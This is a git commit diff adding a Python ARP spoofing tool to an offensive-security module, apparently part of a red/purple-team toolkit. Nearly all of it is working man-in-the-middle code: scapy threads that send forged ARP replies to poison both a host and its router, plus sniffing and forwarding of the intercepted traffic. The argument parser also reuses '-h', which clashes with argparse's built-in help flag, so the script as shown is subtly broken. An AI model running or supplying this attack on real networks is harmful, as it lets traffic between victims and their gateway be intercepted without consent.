b3d6503f02265cb0732d1528a86f16c2fc5c8845
= <=>
2025-03-08 17:07:17 -0300

    adding arp spoof tool

--- src/alpha/v0_1/modules/red_arpspoof.py
+++ src/alpha/v0_1/modules/red_arpspoof.py
@@ -1,42 +1,36 @@
-#!/usr/bin/env python3
-# ARP Spoofing
-
 import argparse
 from scapy.all import *
-from scapy.all import ARP
-from scapy.all import IP
 import time
 import threading
 import sys
+import signal
+
+# Global flag to handle graceful termination
+running = True
 
 def arpSpoof(targetIp, spoofIp, iface):
-    pkt = ARP(op=2,
-    pdst=targetIp,
-    hwdst="ff:ff:ff:ff:ff:ff",
-    psrc=spoofIp)
+    pkt = ARP(op=2, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
     print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
-    while True:
+    while running:
         send(pkt, iface=iface, verbose=False)
         time.sleep(1)
 
 def forwardPacket(pkt, hostIp, routerIp, iface):
-    # If the packet is destined for the router (host-to-router)
+    # Forward packet depending on destination
     if pkt.dst == hostIp and pkt.haslayer(IP):
         sendp(pkt, iface=iface, verbose=False)
-    # If the packet is destined for the host (router-to-host)
     elif pkt.dst == routerIp and pkt.haslayer(IP):
         sendp(pkt, iface=iface, verbose=False)
 
-# Sniff packets and forward them between the host and router
 def sniffAndForward(hostIp, routerIp, iface):
     print(f"Starting packet sniffing on {iface}")
-    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, hostIp, routerIp, iface), store=0)
+    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, hostIp, routerIp, iface), store=0, timeout=10)
 
 def startAttack(hostIp, routerIp, iface):
-    # Start the ARP poisoning threads (poison both Host and Router)
+    # Start ARP poisoning threads
     threading.Thread(target=arpSpoof, args=(hostIp, routerIp, iface), daemon=True).start()
     threading.Thread(target=arpSpoof, args=(routerIp, hostIp, iface), daemon=True).start()
-    # Start sniffing and forwarding packets between Host and Router
+    # Start sniffing and forwarding packets
     sniffAndForward(hostIp, routerIp, iface)
 
 def menu():
@@ -51,16 +45,23 @@ def terminal():
     parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument("-h", "--hostip", required=True, help="Host IP address.")
     parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
-    parser.add_argument("-i", "--interface", required=True, help="Interface that will be used to conduct the attack.\nUsage: purplest-arpspoof -h 192.168.1.10 -t 192.168.1.1 -i eth0")
+    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.\nUsage: python3 arpspoof.py -h 192.168.1.10 -t 192.168.1.1 -i eth0")
 
     args = parser.parse_args()
 
-    if args.hostip is not None and args.targetip is not None and args.interface is not None:
-         startAttack(args.hostip, args.targetip, args.interface)
+    if args.hostip and args.targetip and args.interface:
+        startAttack(args.hostip, args.targetip, args.interface)
     else:
         parser.error("Syntax error.")
 
+def signal_handler(sig, frame):
+    global running
+    print("\nGracefully stopping attack...")
+    running = False
+    sys.exit(0)
+
 def main():
+    signal.signal(signal.SIGINT, signal_handler)  
     if len(sys.argv) > 1:
         terminal()
     else:
